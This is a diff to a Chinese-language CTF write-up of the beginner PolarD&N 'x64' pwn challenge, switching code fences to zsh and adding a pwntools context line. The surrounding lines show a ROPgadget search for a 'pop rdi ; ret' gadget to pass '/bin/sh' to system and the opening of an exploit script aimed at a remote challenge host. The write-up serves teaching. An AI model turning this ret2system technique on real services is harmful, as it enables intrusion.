@@ -8,7 +8,7 @@ layout: doc
 
 ## 基础检查
 > 本例题是PolarD&N的基础入门pwn题 x64
-```bash
+```zsh
 ┌──(kali㉿kali)-[~/win/Downloads]
 └─$ file x64                                            
 x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3497b5907db0d7099f07ea1f7b3ee9ef6761c412, not stripped
@@ -46,7 +46,7 @@ x64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, in
 
 ## 传参/bin/sh给system
 ### 使用ROPgadget找到rdi传入参数
-```bash
+```zsh
 ┌──(kali㉿kali)-[~/win/Downloads]
 └─$ ROPgadget --binary x64 --only "pop|ret" | grep "rdi"
 0x00000000004007e3 : pop rdi ; ret
@@ -65,7 +65,7 @@ pop 是弹出栈上的值给rdi 也就是 rdi被赋值
 ## 编写exp脚本
 ```py
 from pwn import *
-
+context(os="linux", arch='amd64')
 # io = process('./x64')
 io = remote("120.46.59.242",2115)
 
